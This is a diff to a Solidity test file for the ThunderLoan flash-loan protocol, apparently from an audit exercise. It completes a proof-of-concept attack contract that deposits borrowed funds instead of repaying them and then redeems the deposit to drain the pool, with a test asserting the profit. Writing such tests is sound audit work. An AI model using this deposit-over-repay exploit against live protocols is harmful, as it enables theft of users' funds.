@@ -188,12 +188,26 @@ contract ThunderLoanTest is BaseTest {
         DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
         tokenA.mint(address(dor), fee);
         thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
+        dor.redeemMoney();
+        vm.stopPrank();
+
+        assertEq(tokenA.balanceOf(address(dor)), 50e18 + fee);
+    }
+
+    function testDepositAndRedeem() public setAllowedToken hasDeposits {
+        uint256 amountDeposited = DEPOSIT_AMOUNT;
+        vm.startPrank(liquidityProvider);
+        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
+        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
+        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
+        vm.stopPrank();
     }
 }
 
 contract DepositOverRepay is IFlashLoanReceiver {
     ThunderLoan thunderLoan;
     AssetToken assetToken;
+    IERC20 s_token;
 
     constructor(address _thunderLoan) {
         thunderLoan = ThunderLoan(_thunderLoan);
@@ -209,9 +223,16 @@ contract DepositOverRepay is IFlashLoanReceiver {
         external
         returns (bool)
     {
-        assetToken = thunderLoan.getAssetFromToken
-        thunderLoan.deposit(IERC20(token), amount + fee);
+        s_token = IERC20(token);
+        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
+        s_token.approve(address(thunderLoan), amount + fee);
+        thunderLoan.deposit(s_token, amount + fee);
         return true;
+    }
+
+    function redeemMoney() public {
+        uint256 amount = assetToken.balanceOf(address(this));
+        thunderLoan.redeem(IERC20(s_token), amount);
     }
 }
 
